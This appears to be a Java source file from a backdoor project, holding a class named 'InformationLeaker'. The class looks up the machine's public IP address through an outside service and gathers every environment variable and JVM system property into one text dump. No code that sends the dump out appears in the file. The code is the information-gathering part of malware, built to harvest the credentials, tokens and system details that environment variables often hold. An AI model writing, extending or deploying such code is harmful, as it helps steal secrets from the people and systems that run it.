package com.github.pulsebeat02.backdoor;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Enumeration;
import java.util.Map;
import java.util.Properties;

public class InformationLeaker {

  private String information;

  public InformationLeaker() {}

  public void storeNetworkInformation() {
    appendLine("============= NETWORK INFORMATION =============");
    appendLine("IP Address: " + getPublicIPAddress());
    // com.sun.security.auth.module.NTSystem
    appendLine("===============================================");
  }

  public void storeEnvironmentVariables() {
    appendLine("============ ENVIRONMENT VARIABLES ============");
    final Map<String, String> env = System.getenv();
    for (final Map.Entry<String, String> entry : env.entrySet()) {
      appendLine(entry.getKey() + " -> " + entry.getValue());
    }
    appendLine("==============================================");
  }

  public void storeSystemProperties() {
    appendLine("============== SYSTEM PROPERTIES ==============");
    final Properties p = System.getProperties();
    final Enumeration<Object> keys = p.keys();
    while (keys.hasMoreElements()) {
      final String key = (String) keys.nextElement();
      appendLine(key + " -> " + p.getProperty(key));
    }
    appendLine("===============================================");
  }

  private void appendLine(final String line) {
    information += (line + "\n");
  }

  private String getPublicIPAddress() {
    URL url = null;
    try {
      url = new URL("http://checkip.amazonaws.com");
    } catch (final MalformedURLException e) {
      e.printStackTrace();
    }
    try {
      assert url != null;
      try (final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()))) {
        return in.readLine();
      }
    } catch (final IOException ignored) {
    }
    return "";
  }
}
